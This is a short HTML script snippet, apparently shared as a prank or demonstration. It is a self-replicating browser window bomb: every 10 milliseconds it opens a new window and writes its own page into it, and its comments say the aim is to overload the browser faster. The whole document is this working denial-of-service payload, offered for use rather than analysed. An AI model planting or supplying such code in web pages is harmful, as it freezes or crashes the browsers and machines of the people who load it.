<script>
// Open a new window and insert a script to open a new window. Rinse and Repeat.
// This could be in a while loop, 
// but set interval means it won't wait to open a window before trying again,
// which means you get to the overload even faster.

setInterval(function() {
  var w = window.open();
  w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
}, 10);

</script>